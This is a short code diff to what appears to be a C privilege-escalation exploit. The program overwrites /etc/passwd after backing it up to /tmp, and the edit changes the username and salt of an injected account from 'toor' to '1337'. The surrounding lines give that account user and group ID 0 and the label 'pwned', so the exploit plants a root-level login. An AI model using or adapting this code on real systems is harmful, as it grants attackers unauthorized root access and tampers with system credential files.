@@ -35,7 +35,7 @@
  
 const char *filename = "/etc/passwd";
 const char *backup_filename = "/tmp/passwd.bak";
-const char *salt = "toor";
+const char *salt = "1337";
  
 int f;
 void *map;
@@ -119,7 +119,7 @@ int main(int argc, char *argv[])
  
   struct Userinfo user;
   // set values, change as needed
-  user.username = "toor";
+  user.username = "1337";
   user.user_id = 0;
   user.group_id = 0;
   user.info = "pwned";
